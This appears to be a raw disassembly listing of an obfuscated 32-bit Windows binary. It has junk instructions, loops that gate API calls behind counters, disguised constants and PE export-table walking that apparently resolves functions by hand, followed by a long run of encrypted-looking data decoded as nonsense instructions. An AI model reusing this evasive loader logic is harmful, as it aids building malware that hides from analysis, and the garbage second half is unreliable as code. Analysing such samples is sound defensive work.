  4026ca:	add    al,0xc
  4026cc:	xor    al,0x70
  4026ce:	cmp    al,0x29
  4026d0:	mov    DWORD PTR ds:0x413cf0,0x3ac2
  4026da:	jne    0x402787
  4026e0:	add    edx,DWORD PTR ds:0x41401c
  4026e6:	mov    eax,DWORD PTR [ebp+0x8]
  4026e9:	and    DWORD PTR ds:0x413c84,0x0
  4026f3:	jmp    0x402707
  4026f8:	xor    edx,edx
  4026fa:	xor    edx,DWORD PTR ds:0x413c84
  402700:	inc    edx
  402701:	mov    DWORD PTR ds:0x413c84,edx
  402707:	cmp    DWORD PTR ds:0x413c84,0x12
  40270e:	jae    0x40274b
  402714:	cmp    DWORD PTR ds:0x413c84,0x7
  40271b:	jne    0x40272c
  402721:	push   0x4160b3
  402726:	call   DWORD PTR ds:0x41677c
  40272c:	cmp    DWORD PTR ds:0x413c84,0x6
  402733:	jne    0x402746
  402739:	mov    edx,DWORD PTR ds:0x413c84
  40273f:	inc    edx
  402740:	mov    DWORD PTR ds:0x413c84,edx
  402746:	jmp    0x4026f8
  40274b:	mov    ecx,DWORD PTR [ebp+0x8]
  40274e:	add    ecx,DWORD PTR [eax+0x3c]
  402751:	mov    edx,0x7510894
  402756:	mov    DWORD PTR [ebp+0x8],ecx
  402759:	mov    eax,DWORD PTR [ebp-0x4]
  40275c:	xor    eax,edx
  40275e:	push   esi
  40275f:	mov    esi,DWORD PTR [ebp+0x8]
  402762:	mov    ecx,0x3272dc
  402767:	add    eax,ecx
  402769:	cmp    DWORD PTR [esi+0x54],eax
  40276c:	pop    esi
  40276d:	je     0x40277b
  402773:	mov    eax,DWORD PTR [ebp+0x8]
  402776:	jmp    0x402794
  40277b:	mov    eax,DWORD PTR [ebp-0x4]
  40277e:	xor    eax,edx
  402780:	add    eax,ecx
  402782:	jmp    0x402794
  402787:	mov    eax,DWORD PTR [ebp-0x4]
  40278a:	xor    eax,0x7510894
  40278f:	add    eax,0x3272dc
  402794:	leave  
  402795:	ret    0x4
  402798:	push   ebp
  402799:	mov    ebp,esp
  40279b:	sub    esp,0x78
  40279e:	xor    DWORD PTR ds:0x413c1e,0x50b0
  4027a8:	push   ebx
  4027a9:	adc    DWORD PTR ds:0x413d30,0x7f7d
  4027b3:	push   esi
  4027b4:	add    DWORD PTR ds:0x413d30,0x413cf0
  4027be:	push   edi
  4027bf:	push   0x1f
  4027c1:	and    DWORD PTR ds:0x413bf6,0x413c80
  4027cb:	lea    eax,[ebp-0x78]
  4027ce:	push   eax
  4027cf:	push   0x0
  4027d1:	adc    DWORD PTR ds:0x413d34,0x413c80
  4027db:	call   DWORD PTR ds:0x41676c
  4027e1:	push   0x97898797
  4027e6:	call   DWORD PTR ds:0x416754
  4027ec:	sub    ecx,ecx
  4027ee:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4027f5:	xor    DWORD PTR ds:0x414008,0x58a1
  4027ff:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  402806:	mov    ecx,DWORD PTR [ebp-0x4]
  402809:	mov    ebx,0x7510894
  40280e:	xor    ecx,ebx
  402810:	mov    eax,0x3272dc
  402815:	xor    DWORD PTR ds:0x413c6c,0x3fbb
  40281f:	add    ecx,eax
  402821:	mov    DWORD PTR [ebp-0x1c],ecx
  402824:	sbb    DWORD PTR ds:0x413d34,edi
  40282a:	mov    ecx,DWORD PTR [ebp+0x14]
  40282d:	test   ecx,ecx
  40282f:	je     0x402847
  402835:	mov    ecx,DWORD PTR [ebp+0x14]
  402838:	mov    ecx,DWORD PTR [ecx]
  40283a:	or     DWORD PTR ds:0x413c0a,0x414000
  402844:	mov    DWORD PTR [ebp-0x1c],ecx
  402847:	mov    DWORD PTR ds:0x413d34,0x1f
  402851:	cmp    DWORD PTR ds:0x413d34,0x0
  402858:	je     0x40288f
  40285e:	cmp    DWORD PTR ds:0x413d34,0x22
  402865:	jne    0x40287d
  40286b:	push   0x414010
  402870:	push   0x0
  402872:	push   0x416017
  402877:	call   DWORD PTR ds:0x416780
  40287d:	mov    ecx,DWORD PTR ds:0x413d34
  402883:	dec    ecx
  402884:	mov    DWORD PTR ds:0x413d34,ecx
  40288a:	jmp    0x402851
  40288f:	mov    ecx,0x7665
  402894:	sbb    edi,edi
  402896:	imul   edx,eax
  402899:	and    DWORD PTR ds:0x413c80,0x0
  4028a3:	mov    esi,DWORD PTR ds:0x413c80
  4028a9:	inc    esi
  4028aa:	mov    DWORD PTR ds:0x413c80,esi
  4028b0:	cmp    DWORD PTR ds:0x413c80,0xc
  4028b7:	jne    0x4028cb
  4028bd:	push   0x413ce4
  4028c2:	push   DWORD PTR [ebp-0x20]
  4028c5:	call   DWORD PTR ds:0x416784
  4028cb:	cmp    DWORD PTR ds:0x413c80,0xb
  4028d2:	jne    0x4028e5
  4028d8:	mov    esi,DWORD PTR ds:0x413c80
  4028de:	inc    esi
  4028df:	mov    DWORD PTR ds:0x413c80,esi
  4028e5:	cmp    DWORD PTR ds:0x413c80,0x1c
  4028ec:	jb     0x4028a3
  4028f2:	mov    esi,0x76532
  4028f7:	mov    DWORD PTR ds:0x413d30,0x639a
  402901:	add    edx,ecx
  402903:	movzx  edi,BYTE PTR ds:0x413ce4
  40290a:	and    DWORD PTR ds:0x413bfe,edi
  402910:	xchg   esi,ecx
  402912:	sbb    DWORD PTR ds:0x413c80,edi
  402918:	mov    edi,0x54354
  40291d:	mov    DWORD PTR ds:0x413d34,0x5e6f
  402927:	sub    edx,edi
  402929:	mov    ecx,DWORD PTR [ebp-0x4]
  40292c:	xor    ecx,ebx
  40292e:	mov    DWORD PTR ds:0x413c70,0x13
  402938:	cmp    DWORD PTR ds:0x413c70,0x0
  40293f:	je     0x40299c
  402945:	cmp    DWORD PTR ds:0x413c70,0x5
  40294c:	jne    0x402962
  402952:	push   0x7f69
  402957:	push   0x41606e
  40295c:	call   DWORD PTR ds:0x41678c
  402962:	cmp    DWORD PTR ds:0x413c70,0x6
  402969:	jne    0x40297c
  40296f:	mov    esi,DWORD PTR ds:0x413c70
  402975:	dec    esi
  402976:	mov    DWORD PTR ds:0x413c70,esi
  40297c:	mov    esi,DWORD PTR ds:0x413c70
  402982:	dec    esi
  402983:	mov    DWORD PTR ds:0x413c70,esi
  402989:	jmp    0x402938
  40298e:	mov    esi,DWORD PTR ds:0x413cb0
  402994:	mov    esi,DWORD PTR [esi]
  402996:	adc    DWORD PTR ds:0x414008,esi
  40299c:	add    ecx,eax
  40299e:	mov    DWORD PTR [ebp-0x8],ecx
  4029a1:	sub    ecx,ecx
  4029a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4029a6:	sub    DWORD PTR ds:0x413c80,ebx
  4029ac:	xor    ecx,ebx
  4029ae:	add    ecx,eax
  4029b0:	mov    DWORD PTR [ebp-0x24],ecx
  4029b3:	sub    ecx,0x1ce
  4029b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4029bc:	mov    esi,DWORD PTR ds:0x413c1a
  4029c2:	xor    DWORD PTR ds:0x413d1c,esi
  4029c8:	xor    ecx,ebx
  4029ca:	add    ecx,eax
  4029cc:	add    DWORD PTR ds:0x413d34,edi
  4029d2:	mov    DWORD PTR [ebp-0x30],ecx
  4029d5:	movzx  esi,BYTE PTR ds:0x414010
  4029dc:	sbb    esi,DWORD PTR ds:0x413bfe
  4029e2:	mov    DWORD PTR ds:0x414010,esi
  4029e8:	mov    esi,DWORD PTR [ebp-0x4]
  4029eb:	adc    ecx,DWORD PTR ds:0x413c16
  4029f1:	xor    esi,ebx
  4029f3:	xor    DWORD PTR ds:0x41401c,ecx
  4029f9:	add    esi,eax
  4029fb:	and    DWORD PTR ds:0x413c84,0x0
  402a05:	jmp    0x402a17
  402a0a:	mov    ecx,DWORD PTR ds:0x413c84
  402a10:	inc    ecx
  402a11:	mov    DWORD PTR ds:0x413c84,ecx
  402a17:	cmp    DWORD PTR ds:0x413c84,0x19
  402a1e:	jae    0x402af3
  402a24:	cmp    DWORD PTR ds:0x413c84,0xd
  402a2b:	jne    0x402a51
  402a31:	push   0x7c39
  402a36:	push   0x413c1e
  402a3b:	push   0x8717
  402a40:	push   0x416025
  402a45:	push   DWORD PTR [ebp-0x28]
  402a48:	push   DWORD PTR [ebp-0x10]
  402a4b:	call   DWORD PTR ds:0x416790
  402a51:	cmp    DWORD PTR ds:0x413c84,0xc
  402a58:	jne    0x402a6b
  402a5e:	mov    ecx,DWORD PTR ds:0x413c84
  402a64:	inc    ecx
  402a65:	mov    DWORD PTR ds:0x413c84,ecx
  402a6b:	jmp    0x402a0a
  402a70:	mov    DWORD PTR ds:0x413d30,0x12
  402a7a:	cmp    DWORD PTR ds:0x413d30,0x0
  402a81:	je     0x402af3
  402a87:	cmp    DWORD PTR ds:0x413d30,0x21
  402a8e:	jne    0x402a9f
  402a94:	push   0x1529
  402a99:	call   DWORD PTR ds:0x416798
  402a9f:	mov    ecx,DWORD PTR ds:0x413d30
  402aa5:	dec    ecx
  402aa6:	mov    DWORD PTR ds:0x413d30,ecx
  402aac:	jmp    0x402a7a
  402ab1:	and    DWORD PTR ds:0x413d34,0x0
  402abb:	mov    ecx,DWORD PTR ds:0x413d34
  402ac1:	inc    ecx
  402ac2:	mov    DWORD PTR ds:0x413d34,ecx
  402ac8:	cmp    DWORD PTR ds:0x413d34,0x29
  402acf:	jne    0x402ae0
  402ad5:	push   0x413c12
  402ada:	call   DWORD PTR ds:0x41679c
  402ae0:	cmp    DWORD PTR ds:0x413d34,0x19
  402ae7:	jb     0x402abb
  402aed:	or     ecx,DWORD PTR ds:0x413c0a
  402af3:	mov    ecx,DWORD PTR [ebp-0x24]
  402af6:	or     DWORD PTR ds:0x413c88,0x413c12
  402b00:	sub    ecx,eax
  402b02:	add    DWORD PTR ds:0x413c1e,0x57cd
  402b0c:	lea    edx,[esi-0x3272dc]
  402b12:	xor    ecx,ebx
  402b14:	and    DWORD PTR ds:0x413ce8,0xb77
  402b1e:	xor    edx,ebx
  402b20:	mov    DWORD PTR ds:0x413bfe,0x29ac
  402b2a:	cmp    edx,ecx
  402b2c:	mov    DWORD PTR ds:0x413ce4,0x2b4b
  402b36:	je     0x402e02
  402b3c:	sub    ecx,DWORD PTR ds:0x413d34
  402b42:	mov    ecx,DWORD PTR [ebp-0x4]
  402b45:	xor    DWORD PTR ds:0x413bfe,0x413c84
  402b4f:	xor    ecx,ebx
  402b51:	adc    DWORD PTR ds:0x413bf6,0x7b2
  402b5b:	add    ecx,eax
  402b5d:	cmp    esi,ecx
  402b5f:	jne    0x402ddf
  402b65:	or     DWORD PTR ds:0x413cf0,0x413c1e
  402b6f:	push   DWORD PTR [ebp+0x8]
  402b72:	call   0x4026a6
  402b77:	mov    DWORD PTR ds:0x414004,0x1c
  402b81:	cmp    DWORD PTR ds:0x414004,0x0
  402b88:	je     0x402bc3
  402b8e:	cmp    DWORD PTR ds:0x414004,0x2b
  402b95:	jne    0x402ba9
  402b9b:	push   0x413c6c
  402ba0:	push   DWORD PTR [ebp-0x24]
  402ba3:	call   DWORD PTR ds:0x41675c
  402ba9:	xor    ecx,ecx
  402bab:	or     ecx,DWORD PTR ds:0x414004
  402bb1:	dec    ecx
  402bb2:	mov    DWORD PTR ds:0x414004,ecx
  402bb8:	jmp    0x402b81
  402bbd:	sbb    DWORD PTR ds:0x413d34,ecx
  402bc3:	mov    DWORD PTR [ebp-0x18],eax
  402bc6:	and    DWORD PTR ds:0x413d28,0x0
  402bd0:	jmp    0x402be2
  402bd5:	mov    ecx,DWORD PTR ds:0x413d28
  402bdb:	inc    ecx
  402bdc:	mov    DWORD PTR ds:0x413d28,ecx
  402be2:	cmp    DWORD PTR ds:0x413d28,0x16
  402be9:	jae    0x402c2e
  402bef:	cmp    DWORD PTR ds:0x413d28,0x5
  402bf6:	jne    0x402c0f
  402bfc:	push   DWORD PTR [ebp-0x10]
  402bff:	push   0x41400c
  402c04:	push   0x2409
  402c09:	call   DWORD PTR ds:0x416760
  402c0f:	cmp    DWORD PTR ds:0x413d28,0x4
  402c16:	jne    0x402c29
  402c1c:	mov    ecx,DWORD PTR ds:0x413d28
  402c22:	inc    ecx
  402c23:	mov    DWORD PTR ds:0x413d28,ecx
  402c29:	jmp    0x402bd5
  402c2e:	mov    eax,DWORD PTR [ebp-0x4]
  402c31:	sub    DWORD PTR ds:0x413ce4,0x168d
  402c3b:	mov    ecx,DWORD PTR [ebp-0x18]
  402c3e:	inc    edi
  402c3f:	xor    eax,ebx
  402c41:	and    DWORD PTR ds:0x413c88,0x0
  402c4b:	jmp    0x402c5d
  402c50:	mov    edi,DWORD PTR ds:0x413c88
  402c56:	inc    edi
  402c57:	mov    DWORD PTR ds:0x413c88,edi
  402c5d:	cmp    DWORD PTR ds:0x413c88,0x1c
  402c64:	jae    0x402ca8
  402c6a:	cmp    DWORD PTR ds:0x413c88,0x5
  402c71:	jne    0x402c89
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	push   DWORD PTR [ebp-0x10]
  402c7d:	push   DWORD PTR [ebp-0x28]
  402c80:	push   DWORD PTR [ebp-0xc]
  402c83:	call   DWORD PTR ds:0x416764
  402c89:	cmp    DWORD PTR ds:0x413c88,0x4
  402c90:	jne    0x402ca3
  402c96:	mov    edi,DWORD PTR ds:0x413c88
  402c9c:	inc    edi
  402c9d:	mov    DWORD PTR ds:0x413c88,edi
  402ca3:	jmp    0x402c50
  402ca8:	mov    edi,0x3272dc
  402cad:	sbb    DWORD PTR ds:0x414008,0x338e
  402cb7:	add    eax,edi
  402cb9:	cmp    ecx,eax
  402cbb:	mov    DWORD PTR ds:0x413bfe,0x2c9f
  402cc5:	je     0x402e72
  402ccb:	adc    DWORD PTR ds:0x413c74,0x2cc9
  402cd5:	push   DWORD PTR [ebp-0x18]
  402cd8:	add    DWORD PTR ds:0x413c74,0x6616
  402ce2:	push   DWORD PTR [ebp+0x8]
  402ce5:	neg    DWORD PTR ds:0x413d2c
  402ceb:	call   0x407cf9
  402cf0:	mov    DWORD PTR [ebp-0x18],eax
  402cf3:	xor    DWORD PTR ds:0x413c12,ebx
  402cf9:	mov    eax,DWORD PTR [ebp-0x4]
  402cfc:	add    DWORD PTR ds:0x414008,edx
  402d02:	mov    ecx,DWORD PTR [ebp-0x18]
  402d05:	sub    DWORD PTR ds:0x413cdc,0x28ac
  402d0f:	xor    eax,ebx
  402d11:	sub    DWORD PTR ds:0x41400c,0x413ce4
  402d1b:	add    eax,edi
  402d1d:	cmp    ecx,eax
  402d1f:	je     0x402e72
  402d25:	or     DWORD PTR ds:0x414014,edi
  402d2b:	mov    eax,DWORD PTR [ebp-0x18]
  402d2e:	mov    ecx,DWORD PTR ds:0x414008
  402d34:	adc    ecx,DWORD PTR ds:0x413c7c
  402d3a:	mov    DWORD PTR ds:0x414008,ecx
  402d40:	mov    eax,DWORD PTR [eax+0x18]
  402d43:	mov    ecx,DWORD PTR ds:0x413ca4
  402d49:	mov    ecx,DWORD PTR [ecx]
  402d4b:	and    DWORD PTR ds:0x413d28,ecx
  402d51:	mov    DWORD PTR [ebp-0x24],eax
  402d54:	and    DWORD PTR ds:0x413c70,0x0
  402d5e:	mov    ecx,DWORD PTR ds:0x413c70
  402d64:	inc    ecx
  402d65:	mov    DWORD PTR ds:0x413c70,ecx
  402d6b:	cmp    DWORD PTR ds:0x413c70,0xf
  402d72:	jne    0x402d8d
  402d78:	push   0x2d13
  402d7d:	push   0x29b5
  402d82:	push   0x400000
  402d87:	call   DWORD PTR ds:0x416768
  402d8d:	cmp    DWORD PTR ds:0x413c70,0xe
  402d94:	jne    0x402da7
  402d9a:	mov    ecx,DWORD PTR ds:0x413c70
  402da0:	inc    ecx
  402da1:	mov    DWORD PTR ds:0x413c70,ecx
  402da7:	cmp    DWORD PTR ds:0x413c70,0x18
  402dae:	jb     0x402d5e
  402db4:	mov    eax,DWORD PTR [ebp-0x18]
  402db7:	mov    ecx,DWORD PTR [ebp+0x8]
  402dba:	add    ecx,DWORD PTR [eax+0x20]
  402dbd:	mov    DWORD PTR [ebp-0x2c],ecx
  402dc0:	mov    eax,DWORD PTR [ebp-0x18]
  402dc3:	mov    ecx,DWORD PTR [ebp+0x8]
  402dc6:	add    ecx,DWORD PTR [eax+0x24]
  402dc9:	mov    DWORD PTR [ebp-0x34],ecx
  402dcc:	mov    eax,DWORD PTR [ebp-0x18]
  402dcf:	mov    ecx,DWORD PTR [ebp+0x8]
  402dd2:	add    ecx,DWORD PTR [eax+0x1c]
  402dd5:	mov    eax,edi
  402dd7:	mov    DWORD PTR [ebp-0x18],ecx
  402dda:	jmp    0x402e3a
  402ddf:	mov    ecx,DWORD PTR [ebp-0x2c]
  402de2:	mov    edx,DWORD PTR [ebp+0x8]
  402de5:	add    edx,DWORD PTR [ecx+esi*4]
  402de8:	mov    DWORD PTR [ebp-0x28],edx
  402deb:	mov    ecx,DWORD PTR [ebp-0x4]
  402dee:	mov    edx,DWORD PTR [ebp-0x28]
  402df1:	xor    ecx,ebx
  402df3:	add    ecx,eax
  402df5:	cmp    edx,ecx
  402df7:	je     0x402e3a
  402dfd:	jmp    0x402e26
  402e02:	mov    ecx,DWORD PTR [ebp-0x4]
  402e05:	mov    edx,DWORD PTR [ebp-0x8]
  402e08:	xor    ecx,ebx
  402e0a:	add    ecx,eax
  402e0c:	cmp    edx,ecx
  402e0e:	je     0x402e7e
  402e14:	mov    ecx,DWORD PTR [ebp-0x4]
  402e17:	mov    edx,DWORD PTR [ebp-0x30]
  402e1a:	xor    ecx,ebx
  402e1c:	add    ecx,eax
  402e1e:	cmp    edx,ecx
  402e20:	je     0x40522e
  402e26:	lea    eax,[ebp-0x8]
  402e29:	push   eax
  402e2a:	push   DWORD PTR [ebp-0x28]
  402e2d:	push   DWORD PTR [ebp+0xc]
  402e30:	call   0x40a47a
  402e35:	mov    eax,0x3272dc
  402e3a:	mov    ecx,DWORD PTR [ebp-0x4]
  402e3d:	mov    edx,DWORD PTR [ebp-0x8]
  402e40:	xor    ecx,ebx
  402e42:	add    ecx,eax
  402e44:	cmp    edx,ecx
  402e46:	je     0x402e61
  402e4c:	mov    ecx,DWORD PTR [ebp-0x34]
  402e4f:	movzx  ecx,WORD PTR [ecx+esi*2]
  402e53:	mov    edx,DWORD PTR [ebp-0x18]
  402e56:	mov    ecx,DWORD PTR [edx+ecx*4]
  402e59:	mov    DWORD PTR [ebp-0x38],ecx
  402e5c:	jmp    0x402e02
  402e61:	mov    ecx,DWORD PTR [ebp-0x14]
  402e64:	xor    ecx,ebx
  402e66:	lea    esi,[esi+ecx*1+0x3272dc]
  402e6d:	jmp    0x4029fb
  402e72:	mov    eax,DWORD PTR [ebp-0x4]
  402e75:	xor    eax,ebx
  402e77:	add    eax,edi
  402e79:	jmp    0x405392
  402e7e:	mov    eax,DWORD PTR [ebp-0x4]
  402e81:	jmp    0x405222
  402e86:	or     al,0xe7
  402e88:	xchg   BYTE PTR [ebx-0x240e7489],cl
  402e8e:	xchg   bl,cl
  402e90:	pushf  
  402e91:	cmp    DWORD PTR [edx+0x7cc020eb],ecx
  402e97:	jl     0x402f15
  402e99:	jl     0x402e7b
  402e9b:	pop    edi
  402e9c:	jl     0x402f1a
  402e9e:	adc    eax,0x1921172e
  402ea3:	and    eax,0x38652f1b
  402ea8:	imul   ebp,DWORD PTR [eax+0x71],0x6d6c6c62
  402eaf:	xor    al,0xc5
  402eb1:	fsubrp st(1),st
  402eb3:	push   edx
  402eb4:	dec    edx
  402eb5:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff92
  402eb9:	bound  ebp,QWORD PTR [ebp+0x59]
  402ebc:	iret   
  402ebd:	pop    ebp
  402ebe:	dec    esp
  402ebf:	and    cl,BYTE PTR [esi+0x577887fc]
  402ec5:	dec    ebp
  402ec6:	jg     0x402eff
  402ec8:	jb     0x402e72
  402eca:	jg     0x402e6e
  402ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ecd:	cmp    ebp,DWORD PTR [esi]
  402ecf:	jmp    FWORD PTR [eax-0x22]
  402ed2:	cld    
  402ed3:	push   ebx
  402ed4:	jg     0x402ed6
  402ed6:	in     eax,dx
  402ed7:	cmp    ebp,ecx
  402ed9:	mov    esp,0xc01387ed
  402ede:	mov    ebp,DWORD PTR [ecx]
  402ee0:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c68c]
  402ee7:	fld    QWORD PTR [esi]
  402ee9:	(bad)  
  402eea:	lock cld 
  402eec:	sub    BYTE PTR [edx],bl
  402eee:	dec    edx
  402eef:	push   cs
  402ef0:	sub    BYTE PTR [ebx+0x6a],ch
  402ef3:	mov    ecx,0x54113af
  402ef8:	test   al,0xff
  402efa:	jmp    0x34b65a48
  402eff:	retf   0xf95b
  402f02:	sbb    al,0xfc
  402f04:	jp     0x402ea7
  402f06:	arpl   bp,bx
  402f08:	call   0x8416:0x7a18b5f
  402f0f:	xor    ebx,esi
  402f11:	cmp    BYTE PTR [esi],0x74
  402f14:	jae    0x402f21
  402f16:	fsubr  QWORD PTR ds:0x33368d54
  402f1c:	push   esi
  402f1d:	jecxz  0x402eee
  402f1f:	mov    WORD PTR [ecx],gs
  402f21:	mov    DWORD PTR [edx+0x518aceb7],esi
  402f27:	out    0x45,al
  402f29:	push   esp
  402f2a:	dec    esi
  402f2b:	push   cs
  402f2c:	and    bl,dh
  402f2e:	cmp    BYTE PTR [ebx],al
  402f30:	lods   eax,DWORD PTR ds:[esi]
  402f31:	dec    ebx
  402f32:	int3   
  402f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f34:	xor    al,dl
  402f36:	push   es
  402f37:	pop    eax
  402f38:	std    
  402f39:	push   esp
  402f3a:	pop    eax
  402f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3c:	stc    
  402f3d:	push   0xffffffbf
  402f3f:	cli    
  402f40:	inc    esp
  402f41:	push   ds
  402f42:	cmp    BYTE PTR [eax],ah
  402f44:	jne    0x402ec8
  402f46:	bound  esp,QWORD PTR [ebp-0x4a]
  402f49:	leave  
  402f4a:	out    0xec,al
  402f4c:	scas   al,BYTE PTR es:[edi]
  402f4d:	adc    esp,DWORD PTR [eax-0x35da1274]
  402f53:	in     eax,0xe8
  402f55:	fwait
  402f56:	call   0xf1fb:0xec25bc00
  402f5d:	fs and eax,0xb144df7e
  402f63:	mov    esi,0x9487c672
  402f68:	retf   0x4198
  402f6b:	adc    DWORD PTR [ecx-0xf4ac4a5],eax
  402f71:	push   cs
  402f72:	ret    
  402f73:	add    DWORD PTR ds:0x987dd107,eax
  402f79:	jmp    0xabc7:0x97941519
  402f80:	out    0xc5,al
  402f82:	mov    edx,0xa98d8537
  402f87:	sub    eax,DWORD PTR [ecx+eax*4]
  402f8a:	inc    ecx
  402f8b:	xor    DWORD PTR [edx+0x66],ebp
  402f8e:	xchg   esi,eax
  402f8f:	push   ss
  402f90:	jae    0x402f4a
  402f92:	fcomp  DWORD PTR [edx-0x1a]
  402f95:	test   al,0x19
  402f97:	test   al,0xf9
  402f99:	test   BYTE PTR [edi-0x252077fa],dl
  402f9f:	jmp    0xefb8f8c2
  402fa4:	stc    
  402fa5:	fld    DWORD PTR [ebx]
  402fa7:	out    0x2e,eax
  402fa9:	mov    ds:0x34919b67,eax
  402fae:	scas   al,BYTE PTR es:[edi]
  402faf:	mov    ch,0x90
  402fb1:	arpl   WORD PTR [edx+0x1e],bx
  402fb4:	div    cl
  402fb6:	hlt    
  402fb7:	fs inc ebx
  402fb9:	add    DWORD PTR [ecx-0x1],esi
  402fbc:	adc    dh,BYTE PTR [ebx+0x46]
  402fbf:	and    dl,al
  402fc1:	loopne 0x402f73
  402fc3:	mov    esp,0xb0497eb8
  402fc8:	or     al,0xd8
  402fca:	(bad)  
  402fcc:	ret    0x2c06
  402fcf:	pusha  
  402fd0:	jmp    DWORD PTR [ebx]
  402fd2:	push   eax
  402fd3:	div    BYTE PTR ds:0x5227d534
  402fd9:	shr    DWORD PTR [ebx+eax*8],0x4f
  402fdd:	mov    edx,0xb211218
  402fe2:	inc    edx
  402fe3:	dec    ebx
  402fe4:	fwait
  402fe5:	daa    
  402fe6:	jmp    0x402ff2
  402fe8:	js     0x402fca
  402fea:	ins    DWORD PTR es:[edi],dx
  402feb:	fwait
  402fec:	aas    
  402fed:	mov    dl,0xfe
  402fef:	ffree  st(7)
  402ff1:	sub    DWORD PTR [ebp+0xca4c891],edx
  402ff7:	sub    al,0x9a
  402ff9:	ds mov ebx,0x913aa65
  402fff:	clc    
  403000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403001:	fidivr DWORD PTR [edi+edx*8+0x6ddd4253]
  403008:	ret    
  403009:	fistp  WORD PTR [ebp-0x5d727feb]
  40300f:	jmp    0x85dd:0x21c46150
  403016:	and    al,0x80
  403018:	xchg   esp,eax
  403019:	cld    
  40301a:	fisttp QWORD PTR [ecx+0x5233014d]
  403020:	cmp    BYTE PTR [eax-0x1f],dh
  403023:	aaa    
  403024:	adc    DWORD PTR [ebx],0x7146e0d2
  40302a:	push   es
  40302b:	jb     0x402fd8
  40302d:	mov    bh,0x7a
  40302f:	mov    dl,0x2b
  403031:	push   eax
  403032:	push   esp
  403033:	push   eax
  403034:	lahf   
  403035:	test   eax,0x4ae5ddad
  40303a:	jo     0x4030b6
  40303c:	int    0xfb
  40303e:	jns    0x403017
  403040:	mov    BYTE PTR [esi-0x6266c572],dl
  403046:	push   cs
  403047:	pop    ss
  403048:	ins    BYTE PTR es:[edi],dx
  403049:	xor    al,0xcb
  40304b:	add    ah,BYTE PTR [ebx-0x63]
  40304e:	repz xchg ebx,eax
  403050:	pop    ebx
  403051:	lods   eax,DWORD PTR ds:[esi]
  403052:	and    eax,DWORD PTR [ebx]
  403054:	inc    ebp
  403055:	mov    esi,0xdacd36f1
  40305a:	scas   al,BYTE PTR es:[edi]
  40305b:	aad    0xeb
  40305d:	aad    0x86
  40305f:	mov    ch,0xff
  403061:	dec    esi
  403062:	fisttp DWORD PTR [edi+edi*2]
  403065:	add    cl,dh
  403067:	(bad)  
  403069:	scas   al,BYTE PTR es:[edi]
  40306a:	in     eax,0x61
  40306c:	xchg   esi,eax
  40306d:	xchg   ecx,eax
  40306e:	jl     0x403024
  403070:	push   ecx
  403071:	rcr    edx,1
  403073:	test   DWORD PTR [ebx],edi
  403075:	fwait
  403076:	or     ebx,DWORD PTR [ecx]
  403078:	push   esp
  403079:	xor    BYTE PTR ds:0x9b263903,0xee
  403080:	xchg   edi,eax
  403081:	lods   al,BYTE PTR ds:[esi]
  403082:	mov    DWORD PTR [esi-0x72],ecx
  403085:	scas   eax,DWORD PTR es:[edi]
  403086:	inc    ecx
  403087:	jmp    0x40307f
  403089:	adc    dl,dl
  40308b:	pop    ss
  40308c:	push   ebp
  40308d:	mov    ebx,0x5ce4fa32
  403092:	and    eax,0x12450ae9
  403097:	mov    bh,0x7a
  403099:	inc    esi
  40309a:	ficom  WORD PTR ds:0x9e3dbe15
  4030a0:	inc    ecx
  4030a1:	push   es
  4030a2:	shl    DWORD PTR [ecx],1
  4030a4:	call   0x1ef1:0x29bdd764
  4030ab:	arpl   cx,cx
  4030ad:	arpl   WORD PTR [edi+0x3c2c555c],cx
  4030b3:	les    ebx,FWORD PTR [eax+esi*1+0x3a09dd40]
  4030ba:	mov    ebp,0x3e36942
  4030bf:	sbb    al,0xcd
  4030c1:	push   es
  4030c2:	test   al,0xf3
  4030c4:	jmp    0xadaebeb8
  4030c9:	in     al,0x33
  4030cb:	adc    edi,DWORD PTR [ecx+0x73d1df8c]
  4030d1:	mov    bl,0xae
  4030d3:	stos   BYTE PTR es:[edi],al
  4030d4:	xchg   ebx,eax
  4030d5:	mov    cs,edx
  4030d7:	push   edi
  4030d8:	daa    
  4030d9:	sub    ah,ch
  4030db:	jge    0x4030df
  4030dd:	dec    eax
  4030de:	mul    BYTE PTR [ecx]
  4030e0:	pop    ecx
  4030e1:	jns    0x403151
  4030e3:	pop    ss
  4030e4:	cmp    bl,dh
  4030e6:	nop
  4030e7:	addr16 aad 0xcd
  4030ea:	aaa    
  4030eb:	sub    eax,0xc69b5272
  4030f0:	adc    esi,edx
  4030f2:	sub    cl,BYTE PTR [ebp-0x1b6c793a]
  4030f8:	push   eax
  4030f9:	test   eax,0x7e17e5fe
  4030fe:	addr16 push edx
  403100:	loop   0x4030b1
  403102:	in     al,0xc2
  403104:	jne    0x403141
  403106:	pop    edx
  403107:	push   es
  403108:	mov    esp,esi
  40310a:	fwait
  40310b:	sar    ecx,1
  40310d:	push   0xfffffff0
  40310f:	sbb    BYTE PTR [ebx-0x28a348ed],dl
  403115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403116:	ja     0x4030d1
  403118:	adc    cl,BYTE PTR [eax]
  40311a:	test   BYTE PTR [esi],bl
  40311c:	pusha  
  40311d:	(bad)
  403122:	dec    esp
  403123:	retf   0x9328
  403126:	mov    fs:0x5d2d3cb9,eax
  40312c:	sbb    BYTE PTR [edx],ah
  40312e:	push   ds
  40312f:	cmp    ebx,ebp
  403131:	mov    eax,0x2a8804
  403136:	into   
  403137:	lods   eax,DWORD PTR ds:[esi]
  403138:	in     eax,dx
  403139:	call   0xdf65fcd8
  40313e:	out    0x12,al
  403140:	jp     0x403197
  403142:	adc    eax,0x83679d91
  403147:	sub    al,BYTE PTR [edx-0x2dc972e4]
  40314d:	sbb    dh,cl
  40314f:	(bad)  
  403150:	rcl    BYTE PTR [esp+ebx*4-0x26b9e66a],0xa5
  403158:	aam    0x5
  40315a:	mov    edi,0xe32b4e79
  40315f:	js     0x403118
  403161:	cmp    eax,DWORD PTR [ecx-0x7a]
  403164:	stos   BYTE PTR es:[edi],al
  403165:	jb     0x4031db
